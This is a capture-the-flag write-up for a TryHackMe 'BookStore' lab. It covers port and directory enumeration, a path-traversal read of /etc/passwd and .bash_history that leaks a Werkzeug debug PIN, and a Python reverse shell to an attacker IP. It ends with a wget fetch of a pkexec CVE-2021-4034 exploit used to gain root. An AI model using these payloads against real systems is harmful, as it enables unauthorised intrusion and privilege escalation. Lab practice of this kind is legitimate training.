## BookStore
https://tryhackme.com/room/bookstoreoc

## Enum
```
nmap -Pn -sC -sV ip.thm --vv

Scanning ip.thm (10.10.239.177) [1000 ports]
Discovered open port 80/tcp on 10.10.239.177
Discovered open port 22/tcp on 10.10.239.177
Discovered open port 5000/tcp on 10.10.239.177

Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCs5RybjdxaxapwkXwbzqZqONeX4X8rYtfTsy7wey7ZeRNsl36qQWhTrurBWWnYPO7wn2nEQ7Iz0+tmvSI3hms3eIEufCC/2FEftezKhtP1s4/qjp8UmRdaewMW2zYg+UDmn9QYmRfbBH80CLQvBwlsibEi3aLvhi/YrNCzL5yxMFQNWHIEMIry/FK1aSbMj7DEXTRnk5R3CYg3/OX1k3ssy7GlXAcvt5QyfmQQKfwpOG7UM9M8mXDCMiTGlvgx6dJkbG0XI81ho2yMlcDEZ/AsXaDPAKbH+RW5FsC5R1ft9PhRnaIkUoPwCLKl8Tp6YFSPcANVFYwTxtdUReU3QaF9
|   256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCbhAKUo1OeBOX5j9stuJkgBBmhTJ+zWZIRZyNDaSCxG6U817W85c9TV1oWw/A0TosCyr73Mn73BiyGAxis6lNQ=
|   256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAr3xDLg8D5BpJSRh8OgBRPhvxNSPERedYUTJkjDs/jc
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 834559878C5590337027E6EB7D966AEE
|_http-title: Book Store
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
5000/tcp open  http    syn-ack ttl 61 Werkzeug httpd 0.14.1 (Python 3.6.9)
| http-robots.txt: 1 disallowed entry
|_/api </p>
|_http-title: Home
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
nmap -Pn ip.thm -p- --open -min-rate=1000

Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5000/tcp open  upnp
```

```
ffuf -u http://ip.thm:80/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
________________________________________________

.hta                    [Status: 403, Size: 271, Words: 20, Lines: 10, Duration: 426ms]
.htpasswd               [Status: 403, Size: 271, Words: 20, Lines: 10, Duration: 428ms]
.htaccess               [Status: 403, Size: 271, Words: 20, Lines: 10, Duration: 429ms]
assets                  [Status: 301, Size: 301, Words: 20, Lines: 10, Duration: 409ms]
favicon.ico             [Status: 200, Size: 15406, Words: 11, Lines: 1, Duration: 406ms]
images                  [Status: 301, Size: 301, Words: 20, Lines: 10, Duration: 399ms]
index.html              [Status: 200, Size: 6452, Words: 470, Lines: 162, Duration: 412ms]
javascript              [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 395ms]
server-status           [Status: 403, Size: 271, Words: 20, Lines: 10, Duration: 475ms]
:: Progress: [4713/4713] :: Job [1/1] :: 98 req/sec :: Duration: [0:00:50] :: Errors: 0 ::
```
![image](https://user-images.githubusercontent.com/6504854/188821655-90c1acfb-2391-41b2-ae62-b1cd210f549f.png)

![image](https://user-images.githubusercontent.com/6504854/188821872-9565c780-974b-4028-af8a-badf1b12576f.png)

![image](https://user-images.githubusercontent.com/6504854/188822394-55bcaeed-824e-4860-bc42-d2efb1060a2c.png)
🏴 PIN in SID's .bash_history.

![image](https://user-images.githubusercontent.com/6504854/188822581-28a4d104-a0e9-4750-a4fd-97b1f8a83a15.png)
🏴 Previous ver api has LFI.

```
ffuf -u http://ip.thm:5000/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt          
________________________________________________

api                     [Status: 200, Size: 825, Words: 82, Lines: 12, Duration: 613ms]
console                 [Status: 200, Size: 1985, Words: 411, Lines: 53, Duration: 464ms]
robots.txt              [Status: 200, Size: 45, Words: 5, Lines: 2, Duration: 410ms]
:: Progress: [4713/4713] :: Job [1/1] :: 44 req/sec :: Duration: [0:01:56] :: Errors: 0 ::
```

```
curl http://ip.thm:5000/robots.txt
<p>User-agent: *<br><br>
Disallow: /api </p>

curl http://ip.thm:5000/api

        <title>API Documentation</title>
        <h1>API Documentation</h1>
        <h3>Since every good API has a documentation we have one as well!</h3>
        <h2>The various routes this API currently provides are:</h2><br>
        <p>/api/v2/resources/books/all (Retrieve all books and get the output in a json format)</p>
        <p>/api/v2/resources/books/random4 (Retrieve 4 random records)</p>
        <p>/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)</p>
        <p>/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)</p>
        <p>/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)</p>
        <p>/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)</p>

 curl http://ip.thm:5000/console
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
  "http://www.w3.org/TR/html4/loose.dtd">
<html>
  <head>
    <title>Console // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css"
        type="text/css">
    <!-- We need to make sure this has a favicon so that the debugger does
         not by accident trigger a request to /favicon.ico which might
         change the application state. -->
    <link rel="shortcut icon"
        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=jquery.js"></script>
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
    <script type="text/javascript">
      var TRACEBACK = -1,
          CONSOLE_MODE = true,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "dsxt7nlDdLoZhk97sNdl";
    </script>
  </head>
  <body style="background-color: #fff">
    <div class="debugger">
<h1>Interactive Console</h1>
<div class="explanation">
In this console you can execute Python expressions in the context of the
application.  The initial namespace was created by the debugger automatically.
</div>
<div class="console"><div class="inner">The Console requires JavaScript.</div></div>
      <div class="footer">
        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
        friendly Werkzeug powered traceback interpreter.
      </div>
    </div>

    <div class="pin-prompt">
      <div class="inner">
        <h3>Console Locked</h3>
        <p>
          The console is locked and needs to be unlocked by entering the PIN.
          You can find the PIN printed out on the standard output of your
          shell that runs the server.
        <form>
          <p>PIN:
            <input type=text name=pin size=14>
            <input type=submit name=btn value="Confirm Pin">
        </form>
      </div>
    </div>
  </body>
</html>
```
🏴 Mmmmmm, this console works python?

![image](https://user-images.githubusercontent.com/6504854/188820853-da757e46-b305-4b02-a772-27b967fd3c51.png)

🏴 What is pin no? I tried dsxt7nlDdLoZhk97sNdl, it didn't work.

![image](https://user-images.githubusercontent.com/6504854/188823685-96404e3d-e2c0-4255-a9fa-552dd42adfe7.png)

![image](https://user-images.githubusercontent.com/6504854/188824030-e368e97c-8926-4715-a627-295382620989.png)

🏴 Api v1 returned the collect response, api v1 might work same as v2. I couldn't find LFI, so I seeked anoter end-point.

```
 ffuf -u http://ip.thm:5000/api/v1/resources/books?FUZZ=1 -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/actions-lowercase.txt
________________________________________________

show                    [Status: 500, Size: 23076, Words: 3277, Lines: 357, Duration: 427ms]
:: Progress: [109/109] :: Job [1/1] :: 44 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

```
curl http://ip.thm:5000/api/v1/resources/books?show=1
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
  "http://www.w3.org/TR/html4/loose.dtd">
<html>
  <head>
    <title>NameError: name 'filename' is not defined // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css"
        type="text/css">
    <!-- We need to make sure this has a favicon so that the debugger does
         not by accident trigger a request to /favicon.ico which might
         change the application state. -->
    <link rel="shortcut icon"
        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=jquery.js"></script>
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
    <script type="text/javascript">
      var TRACEBACK = 139988917414768,
          CONSOLE_MODE = false,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "bkYIZk2zPQ6OwegR8sFK";
    </script>
  </head>
  <body style="background-color: #fff">
    <div class="debugger">
<h1>builtins.NameError</h1>

File "/home/sid/api.py", line 151, in api_filter
    return filename
NameError: name 'filename' is not defined
-->
```
![image](https://user-images.githubusercontent.com/6504854/188825680-ebbad0c1-7dba-46fa-975b-8482890210a0.png)

🏴 Mmmmmm, filename? This parameter might accept the file?

```
curl http://ip.thm:5000/api/v1/resources/books?show=../../../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sid:x:1000:1000:Sid,,,:/home/sid:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
```

```
curl http://ip.thm:5000/api/v1/resources/books?show=.bash_history

cd /home/sid
whoami
export WERKZEUG_DEBUG_PIN=123-321-135
echo $WERKZEUG_DEBUG_PIN
python3 /home/sid/api.py
ls
exit
```
🏴 I got PIN, accessed cosole and typed python reversshell below. 

```
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

## Flag
```
listening on [any] 4444 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.127.74] 56524
/bin/sh: 0: can't access tty; job control turned off

$ id
uid=1000(sid) gid=1000(sid) groups=1000(sid)

$ python3 -c "import pty;pty.spawn('/bin/bash')";
sid@bookstore:~$ cd /home
cd /home
sid@bookstore:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root root 4096 Oct 20  2020 .
drwxr-xr-x 23 root root 4096 Oct 20  2020 ..
drwxr-xr-x  5 sid  sid  4096 Oct 20  2020 sid
sid@bookstore:/home$ cd sid
cd sid
sid@bookstore:~$ ls -la
ls -la
total 80
drwxr-xr-x 5 sid  sid   4096 Oct 20  2020 .
drwxr-xr-x 3 root root  4096 Oct 20  2020 ..
-r--r--r-- 1 sid  sid   4635 Oct 20  2020 api.py
-r-xr-xr-x 1 sid  sid    160 Oct 14  2020 api-up.sh
-r--r----- 1 sid  sid    116 Sep  7 12:08 .bash_history
-rw-r--r-- 1 sid  sid    220 Oct 20  2020 .bash_logout
-rw-r--r-- 1 sid  sid   3771 Oct 20  2020 .bashrc
-rw-rw-r-- 1 sid  sid  16384 Oct 19  2020 books.db
drwx------ 2 sid  sid   4096 Oct 20  2020 .cache
drwx------ 3 sid  sid   4096 Oct 20  2020 .gnupg
drwxrwxr-x 3 sid  sid   4096 Oct 20  2020 .local
-rw-r--r-- 1 sid  sid    807 Oct 20  2020 .profile
-rwsrwsr-x 1 root sid   8488 Oct 20  2020 try-harder
-r--r----- 1 sid  sid     33 Oct 15  2020 user.txt
sid@bookstore:~$ cat user.txt
cat user.txt
4e********************
sid@bookstore:~$ ./try-harder
./try-harder
What's The Magic Number?!
1111
1111
Incorrect Try Harder
sid@bookstore:~$ ./try-harder
./try-harder
What's The Magic Number?!
dsxt7nlDdLoZhk97sNdl
dsxt7nlDdLoZhk97sNdl
Incorrect Try Harder

sid@bookstore:~$  ls -la /usr/bin/pkexec
 ls -la /usr/bin/pkexec
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec

sid@bookstore:~$ wget 10.10.10.10/1.tar
sid@bookstore:~$ tar -xvf 1.tar
sid@bookstore:~$ ./cve-2021-4034
./cve-2021-4034

# cat /root/root.txt
cat /root/root.txt
e2**************************
# exit
```
Ghidraとか得意じゃないんです...Reversingの問題苦手でつい....

## Omake
Ffuf is faster than rustbuster on my machine at this time.
```
rustbuster dir -u http://ip.thm:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
~ rustbuster v3.0.3 ~ by phra & ps1dr3x ~

[?] Started at  : 2022-09-06 20:12:13

GET     403 Forbidden                   http://ip.thm:80/.htaccess
GET     403 Forbidden                   http://ip.thm:80/.hta
GET     403 Forbidden                   http://ip.thm:80/.htpasswd
GET     301 Moved Permanently           http://ip.thm:80/assets
                                                => http://ip.thm/assets/
GET     200 OK                          http://ip.thm:80/favicon.ico
GET     301 Moved Permanently           http://ip.thm:80/images
                                                => http://ip.thm/images/
GET     200 OK                          http://ip.thm:80/index.html
GET     301 Moved Permanently           http://ip.thm:80/javascript
                                                => http://ip.thm/javascript/
GET     403 Forbidden                   http://ip.thm:80/server-status
  [00:03:17] ########################################    4710/4710    ETA: 00:00:00 req/s: 23

[?] Ended at: 2022-09-06 20:15:30

```

Thank you for your time. Happy Hacking, Enjoy! 😄



